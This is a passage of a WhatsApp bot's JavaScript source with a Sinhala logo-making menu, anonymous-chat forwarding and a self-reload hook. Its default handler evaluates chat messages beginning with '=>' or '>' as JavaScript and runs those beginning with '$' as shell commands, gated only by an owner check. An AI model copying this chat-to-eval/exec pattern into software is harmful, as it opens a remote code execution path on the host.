										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `lion2 ${text}`
									}
								]
							},
							{
								"title": "༺𝐀𝐋𝐈𝐕𝐄༻️",
								"rows": [
									{
										"title": "༺𝐀𝐋𝐈𝐕𝐄༻",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒\n𝙰𝙻𝙸𝚅𝙴😉",
										"rowId": `alive`
									}
								]
							}
						]
          const listMessage = {
  text: "🔎༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒\n𝐋𝐎𝐆𝐎 𝐌𝐀𝐊𝐈𝐍𝐆 𝐒𝐈𝐒𝐓𝐄𝐌\nඔබට අවශ්‍ය ලොගෝ එක තෝරන්න🔎",
  footer: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒`,
  title: `Hi 👋 ${pushname}`,
  buttonText: "තෝරන්න🗒",
  sections
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, listMessage)
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Find Partners', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }       

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
	